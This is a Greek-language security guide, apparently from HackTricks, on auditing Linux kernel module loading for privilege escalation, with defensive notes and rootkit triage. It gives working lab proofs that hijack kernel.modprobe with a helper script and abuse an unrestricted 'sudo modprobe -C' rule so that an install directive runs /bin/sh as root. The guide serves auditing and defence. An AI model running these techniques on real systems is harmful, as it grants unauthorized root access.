# Κατάχρηση μονάδων πυρήνα και του modprobe

{{#include ../../banners/hacktricks-training.md}}

## Εσφαλμένες ρυθμίσεις μονάδων πυρήνα και φόρτωσης μονάδων

Η υποστήριξη μονάδων πυρήνα είναι ένας τομέας υψηλού αντίκτυπου κατά τον έλεγχο για κλιμάκωση προνομίων στο Linux. Μην θεωρείτε ότι κάθε μήνυμα για μη υπογεγραμμένες μονάδες αποτελεί από μόνο του εκμεταλλεύσιμη ευπάθεια, αλλά αξιοποιήστε το για να απαντήσετε σε πρακτικά ερωτήματα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Μπορεί ο τρέχων χρήστης να φορτώσει μονάδες μέσω `sudo`, capabilities ή μιας εγγράψιμης διαδρομής βοηθητικού προγράμματος;
- Είναι ακόμη ενεργή η φόρτωση μονάδων;
- Είναι απενεργοποιημένη η επιβολή υπογραφής μονάδων;
- Είναι εγγράψιμοι οι κατάλογοι μονάδων, τα αρχεία μονάδων ή οι διαδρομές ρυθμίσεων του `modprobe.d`;<sup>[[16]](#references)</sup>
- Μπορούν να διαβαστούν τα αρχεία καταγραφής του πυρήνα για επιβεβαίωση του τι συνέβη;

Η αρχική διαλογή ξεκινά με τους ακόλουθους ελέγχους κατάστασης μονάδων, υπογραφών, καταγραφής και δέντρου μονάδων.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Ερμηνεία:

- `modules_disabled=1` σημαίνει ότι τα modules δεν μπορούν ούτε να φορτωθούν ούτε να εκφορτωθούν, και η τιμή δεν μπορεί να επαναφερθεί σε `0` πριν από την επανεκκίνηση.<sup>[[1]](#references)</sup>
- Το `module.sig_enforce=1` στη γραμμή εντολών του kernel ή το `CONFIG_MODULE_SIG_FORCE=y` απαιτεί modules με έγκυρη υπογραφή· διαφορετικά, μπορεί να φορτωθούν unsigned modules και να επισημάνουν τον kernel ως tainted.<sup>[[2]](#references)</sup>
- Το `dmesg_restrict=0` δεν επιβάλλει περιορισμούς στο `dmesg`· όταν είναι `1`, η πρόσβαση απαιτεί `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Τα εγγράψιμα paths κάτω από το `/lib/modules/$(uname -r)/` είναι επικίνδυνα, επειδή το `modprobe` αναζητά σε αυτό το δέντρο και στα δεδομένα εξαρτήσεών του κατά τη φόρτωση modules.<sup>[[8]](#references)</sup>

### Φόρτωση ενός module και ανάγνωση της εξόδου του kernel

Αν έχεις νόμιμη άδεια να φορτώσεις ένα τοπικό module, το `insmod` εισάγει το ακριβές αρχείο `.ko` που του δίνεις. Η συνάρτηση init του module εκτελείται κατά τη φόρτωσή του, και τα μηνύματα που γράφονται με `printk()` καταλήγουν στο buffer καταγραφής του kernel, το οποίο συνήθως διαβάζεται με `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Μια ελάχιστη ροή εργασίας ελέγχου χρησιμοποιεί το `modinfo` για την εξέταση των μεταδεδομένων, τα `insmod` και `rmmod` για τη φόρτωση και την αφαίρεση ενός module, το `lsmod` για την επιβεβαίωση ότι έχει φορτωθεί και το `dmesg` για την εξέταση των καταγραφών του kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Αν το `sudo -l` επιτρέπει τα `insmod`, `modprobe` ή κάποιο wrapper γύρω από αυτά, αντιμετωπίστε το ως κρίσιμο: το `sudo -l` εμφανίζει τα δικαιώματα του χρήστη που το εκτελεί, ενώ η φόρτωση ενός kernel module απαιτεί `CAP_SYS_MODULE`. Δείτε το [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) για άμεσες διαδρομές μέσω capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` με δικαίωμα sudo

Ένας κανόνας sudo που επιτρέπει σε έναν χρήστη να εκτελεί το `insmod` δεν είναι συγκρίσιμος με την άδεια χρήσης ενός συνηθισμένου διαχειριστικού βοηθητικού προγράμματος. Ο κώδικας αρχικοποίησης του module εκτελείται κατά την εισαγωγή του, επομένως το πρακτικό ερώτημα κατά τον έλεγχο είναι αν ο χρήστης μπορεί να επιλέξει ή να τροποποιήσει το module που θα φορτωθεί.<sup>[[3]](#references)</sup>

Η ακόλουθη γενική διαδικασία ελέγχου επαναλαμβάνει αυτούς τους ελέγχους επιθεώρησης, φόρτωσης, κατάστασης, καταγραφών και αφαίρεσης για ένα υποψήφιο module.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Αν ο χρήστης μπορεί να παρέχει αυθαίρετο αρχείο `.ko`, στο πλαίσιο μιας εξουσιοδοτημένης αξιολόγησης αυτό πρέπει να αντιμετωπίζεται ως πλήρης παραβίαση του συστήματος. Ασφαλέστερη πρακτική είναι να μην αναθέτετε τη φόρτωση modules μέσω sudo· αν αυτό είναι αναπόφευκτο, περιορίστε την ακριβή διαδρομή, τον κάτοχο, τα δικαιώματα, την πολιτική υπογραφής και τη διαδικασία αφαίρεσης.<sup>[[3]](#references)[[10]](#references)</sup>

Παρακάτω παρουσιάζονται μια ελάχιστη πηγή και ένα Makefile, για ένα ακίνδυνο μοτίβο δημιουργίας module σε ελεγχόμενο εργαστήριο· η μορφή `make -C /lib/modules/$(uname -r)/build M=$PWD` ακολουθεί την τεκμηριωμένη ροή εργασιών kbuild του kernel για εξωτερικά modules.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Μεταγλωττίστε και φορτώστε το μόνο σε εξουσιοδοτημένο εργαστήριο· το kbuild μεταγλωττίζει το εξωτερικό άρθρωμα και οι εντολές φόρτωσης/αφαίρεσης καλούν τις διεπαφές αρθρωμάτων του πυρήνα.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Έλεγχοι κατάχρησης του `kernel.modprobe` / `modprobe_path`

Το `kernel.modprobe` ορίζει το βοηθητικό πρόγραμμα userspace που εκτελεί ο kernel για αιτήματα αυτόματης φόρτωσης module· αυτό το sysctl επηρεάζει την αυτόματη φόρτωση, όχι τη ρητή εισαγωγή module. Αν ένας επιτιθέμενος μπορεί να το αλλάξει ώστε να δείχνει σε εκτελέσιμο αρχείο με δυνατότητα εγγραφής και να προκαλέσει ένα αίτημα φόρτωσης module, το βοηθητικό πρόγραμμα γίνεται διαδρομή εκτέλεσης κώδικα με προνόμια. Αν οριστεί σε κενή συμβολοσειρά, απενεργοποιούνται τα αιτήματα αυτόματης φόρτωσης· αν ισχύει `CONFIG_STATIC_USERMODEHELPER=y`, μια μη κενή τιμή παρακάμπτεται από τη διαδρομή του στατικού βοηθητικού προγράμματος που έχει ενσωματωθεί κατά τη μεταγλώττιση.<sup>[[1]](#references)</sup>

Ελέγξτε την τρέχουσα διαδρομή του βοηθητικού προγράμματος μέσω της διεπαφής sysctl του kernel και εξετάστε τον ιδιοκτήτη και τα δικαιώματα του προορισμού.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Ελέγξτε αν μπορούν να επηρεαστούν τα sysctl, οι εκχωρημένοι κανόνες sudo ή οι δυνατότητες αρχείων.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Το ακόλουθο μοτίβο, μόνο για χρήση σε εργαστήριο, αλλάζει τη διαδρομή του helper και ενεργοποιεί ένα τεκμηριωμένο αίτημα αυτόματης φόρτωσης module· χρησιμοποιήστε το μόνο σε απομονωμένο σύστημα για το οποίο έχετε εξουσιοδότηση.<sup>[[1]](#references)</sup>

Σε σύγχρονους πυρήνες Linux, μην χρησιμοποιείτε ένα άγνωστο εκτελέσιμο ως γενικό trigger: η παλαιότερη αυτόματη φόρτωση module για προσαρμοσμένες μορφές binary καταργήθηκε στο Linux 6.14, ενώ η τεκμηρίωση του πυρήνα προσδιορίζει έναν άγνωστο τύπο filesystem ως διαδρομή αιτήματος αυτόματης φόρτωσης module.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Σε hardened συστήματα, αυτό θα πρέπει να αποτυγχάνει όταν τα δικαιώματα εμποδίζουν μη προνομιούχους χρήστες να γράψουν στο `kernel.modprobe`, η διαδρομή του helper δεν είναι εγγράψιμη ή η αυτόματη φόρτωση modules είναι απενεργοποιημένη.<sup>[[1]](#references)</sup>

### Εγγράψιμη διαμόρφωση `modprobe.d` και `sudo modprobe -C`

Πριν από την επίλυση ενός module, το `modprobe` διαβάζει αρχεία `.conf` από καταλόγους διαμόρφωσης, όπως οι `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` και `/lib/modprobe.d`, με τη σειρά προτεραιότητας. Ένα αρχείο με το ίδιο όνομα σε κατάλογο υψηλότερης προτεραιότητας υπερισχύει του αρχείου σε κατάλογο χαμηλότερης προτεραιότητας. Το σημαντικότερο είναι ότι μια οδηγία `install <module> <command>` εκτελεί μια αυθαίρετη εντολή shell **αντί να** εισαγάγει αυτό το module. Επομένως, μια εγγράψιμη διαδρομή διαμόρφωσης μπορεί να οδηγήσει σε καθυστερημένη εκτέλεση εντολών με τα διαπιστευτήρια ενός μεταγενέστερου προνομιούχου χρήστη που εκτελεί `modprobe`· η επιβολή υπογραφών kernel δεν επαληθεύει αυτή την εντολή userspace.<sup>[[16]](#references)</sup>

Ελέγξτε τα δικαιώματα καταλόγων και αρχείων και, στη συνέχεια, επιθεωρήστε την ενεργή διαμόρφωση. Το `modprobe -n -v` είναι ασφαλές για τον έλεγχο της επίλυσης, επειδή η λειτουργία dry-run δεν εισάγει το module ούτε εκτελεί εντολή `install`/`remove`. Προτιμήστε το `modprobe -c` αντί για την παλαιότερη σύνταξη `--showconfig`, την οποία η τρέχουσα τεκμηρίωση του kmod χαρακτηρίζει προς κατάργηση μετά το kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Ένας μη περιοριστικός κανόνας sudo για το `modprobe` είναι εκμεταλλεύσιμος ακόμη κι όταν δεν είναι δυνατή η επαλήθευση υπογραφής αυθαίρετων αρχείων `.ko`: το `-C` επιλέγει έναν κατάλογο ρυθμίσεων που ελέγχει ο επιτιθέμενος, από τον οποίο μπορεί να εκτελεστεί μια εντολή `install` από τη διεργασία που εκκινεί το sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Για τον μετριασμό, μην εκχωρείτε μέσω sudo δικαίωμα εκτέλεσης του `modprobe` χωρίς περιορισμούς ορισμάτων, διατηρείτε κάθε κατάλογο ρυθμίσεων ιδιοκτησίας του root και χωρίς δικαίωμα εγγραφής και ελέγχετε για μη αναμενόμενες οδηγίες `install`/`remove`. Όταν μια έμπιστη διοικητική διαδικασία πρέπει να παρακάμψει τέτοιες οδηγίες για ένα module, το `modprobe --ignore-install` τις αγνοεί για το συγκεκριμένο module, αλλά οι εξαρτήσεις μπορεί να έχουν δικές τους εντολές.<sup>[[8]](#references)[[16]](#references)</sup>

### Έλεγχος εγγράψιμων `/lib/modules`

Οι εγγράψιμοι κατάλογοι modules μπορούν να επιτρέψουν την αντικατάσταση modules, την τοποθέτηση κακόβουλων modules ή την κατάχρηση της αυτόματης φόρτωσης, ανάλογα με τον τρόπο με τον οποίο θα κληθεί αργότερα το `modprobe`· το `modprobe` αναζητά στο `/lib/modules/$(uname -r)` και χρησιμοποιεί τα δεδομένα εξαρτήσεών του κατά την επίλυση modules.<sup>[[8]](#references)</sup>

Ελέγξτε για εγγράψιμα αρχεία modules και μεταδεδομένα εξαρτήσεων/ψευδωνύμων στο δέντρο modules της ενεργής έκδοσης του kernel.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Αν εντοπίσετε εγγράψιμο περιεχόμενο μονάδας, εξετάστε πώς το `modprobe` επιλύει τις εξαρτήσεις και πώς το `modinfo` αναφέρει τα μεταδεδομένα της μονάδας.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Αμυντικές σημειώσεις:

- Διατηρήστε το `/lib/modules` με ιδιοκτήτη `root:root` και χωρίς δικαίωμα εγγραφής από χρήστες.<sup>[[8]](#references)</sup>
- Ορίστε το `kernel.modules_disabled=1` μετά την εκκίνηση, όπου αυτό είναι λειτουργικά εφικτό.<sup>[[1]](#references)</sup>
- Επιβάλετε την υπογραφή modules σε συστήματα που απαιτούν φορτώσιμα modules.<sup>[[2]](#references)</sup>
- Παρακολουθείτε τις εγγραφές στα `/proc/sys/kernel/modprobe`, `/lib/modules` και στους καταλόγους ρυθμίσεων `modprobe.d`, καθώς και την απρόσμενη εκτέλεση των `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Διαλογή περιστατικών rootkit βασισμένου σε module

Ένα κακόβουλο module μπορεί να παρεμβάλλεται σε syscalls, προβολές VFS ή `/proc`, διαδρομές δικτύου ή ελέγχους διαπιστευτηρίων, ώστε να αποκρύπτει διεργασίες και αρχεία, να ανακατευθύνει την κίνηση ή να υποκλέπτει μυστικά. Μπορεί επίσης να αφαιρέσει τον εαυτό του από τη λίστα modules που εμφανίζει το `lsmod`. Η επιμονή μπορεί να επιτευχθεί μέσω aliases ή κανόνων εγκατάστασης στο `modprobe.d`, του `/etc/modules-load.d`, μιας μονάδας systemd, περιεχομένου initramfs ή αντικατάστασης ενός νόμιμου αρχείου `.ko`. Ένα φυσιολογικό αποτέλεσμα από το `lsmod` αποτελεί χρήσιμο στοιχείο, αλλά ένας συμβιβασμός σε επίπεδο kernel μπορεί να καταστήσει αναξιόπιστες τις λίστες που παρέχει ο kernel. Διασταυρώστε τα φορτωμένα modules, τα αρχεία στον δίσκο, τις ρυθμίσεις εκκίνησης, τα αρχεία καταγραφής φόρτωσης modules και αξιόπιστα εξωτερικά δεδομένα τηλεμετρίας.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Ελέγξτε για μη αναμενόμενα ονόματα μονάδων, διαδρομές, εξαρτήσεις, υπογραφές και χρόνους φόρτωσης. Οι ενδείξεις για kernel taint και τα μηνύματα για μη υπογεγραμμένες μονάδες είναι στοιχεία προς διερεύνηση, όχι απόδειξη ύπαρξης rootkit. Αν υπάρχει υποψία για rootkit, συλλέξτε στοιχεία από έμπιστο image ή περιβάλλον αποκατάστασης προτού βασιστείτε στην έξοδο του ενεργού kernel. Η σελίδα [αξιολόγηση ευπαθειών kernel](kernel-vulnerability-assessment.md) καλύπτει την έκθεση σε ζητήματα ρυθμίσεων και διαγνωστικών, συμπεριλαμβανομένων των tracefs και των pinned αντικειμένων BPF.

## References

- [1] [Τεκμηρίωση για το /proc/sys/kernel/ — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Μηχανισμός υπογραφής μονάδων kernel — Τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Βασικά στοιχεία προγραμμάτων οδήγησης — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Καταγραφή μηνυμάτων με printk — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Δημιουργία εξωτερικών μονάδων — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Συγχώνευση tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
